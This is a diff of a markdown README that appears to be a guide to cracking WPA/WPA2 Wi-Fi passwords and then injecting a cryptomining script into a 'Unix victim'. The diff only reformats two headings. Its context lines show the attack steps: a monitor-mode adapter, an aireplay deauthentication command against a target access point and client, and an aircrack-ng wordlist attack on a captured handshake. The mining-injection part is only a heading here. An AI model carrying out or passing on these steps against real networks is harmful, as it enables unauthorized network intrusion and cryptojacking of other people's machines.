@@ -1,5 +1,5 @@
 # Gaining access to WPA/WPA2 with short/easy password and inject mining script to Unix victim
-Part 1. Gaining access to WIFI:
+## Part 1. Gaining access to WIFI:
 1. Install kali
 2. Buy and hook a NIC (I used alfa awus036neh) that can use monitor mode to VM (assuming your interface name is wlan0)
 ``` 
@@ -26,5 +26,5 @@ aireplay --deauth 0 -a BSSID -c MAC wlan0
 ```
 aircrack-ng output-01.cap -w wl.txt
 ```
-Part 2. Injecting malicious script to victim machine.
+## Part 2. Injecting malicious script to victim machine.
 
